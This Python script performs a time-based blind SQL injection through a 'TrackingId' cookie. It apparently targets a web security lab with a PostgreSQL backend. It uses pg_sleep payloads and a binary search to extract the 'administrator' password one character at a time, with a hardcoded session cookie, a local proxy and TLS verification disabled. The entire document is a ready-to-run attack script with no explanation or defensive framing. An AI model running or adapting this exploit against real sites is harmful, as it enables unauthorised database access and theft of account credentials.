import sys
import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def greater_than_mid(url, mid, i):
    sqli_payload = "' || (select case when(username='administrator' and ascii(substring(password,%s,1))>%s) then pg_sleep(3) else pg_sleep(-1) end from users)--" % (i, mid)

    cookie = {'TrackingId': '3TnVbdW9aOPZUgmW' + sqli_payload,
              'session': 'ZEOQInLmfYir1iC3E0zpWWFQN9NOOZDo'}

    r = requests.get(url, cookies=cookie, verify=False, proxies=proxy)

    if int(r.elapsed.total_seconds()) > 2:
        return True
    else:
        return False


def check_mid(url, mid, i):
    sqli_payload = "' || (select case when(username='administrator' and ascii(substring(password,%s,1))=%s) then pg_sleep(3) else pg_sleep(-1) end from users)--" % (i, mid)

    cookie = {'TrackingId': '3TnVbdW9aOPZUgmW' + sqli_payload,
              'session': 'ZEOQInLmfYir1iC3E0zpWWFQN9NOOZDo'}

    r = requests.get(url, cookies=cookie, verify=False, proxies=proxy)

    if int(r.elapsed.total_seconds()) > 2:
        return True
    else:
        return False


def get_password(url):
    password_extracted = ""
    for i in range(1, 21):
        l = 48
        r = 123
        while l <= r:
            mid = (l+r)//2

            sys.stdout.write('\r' + password_extracted + chr(mid))
            sys.stdout.flush()

            if greater_than_mid(url, mid, i):
                l = mid + 1
            elif check_mid(url, mid, i):
                password_extracted += chr(mid)
                break
            else:
                r = mid - 1

        sys.stdout.write('\r' + password_extracted)
        sys.stdout.flush()


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        sys.exit(0)
    except KeyboardInterrupt:
        print("\n[-] Keyboard Interrupt Detected.")
        print("[-] Exiting...")

    print("[+] Retrieving administrator password...")

    st = time.time()
    get_password(url)
    et = time.time()

    et = et - st

    print(f"\n[+] Elaspsed time: {round(et, 2)} seconds.")
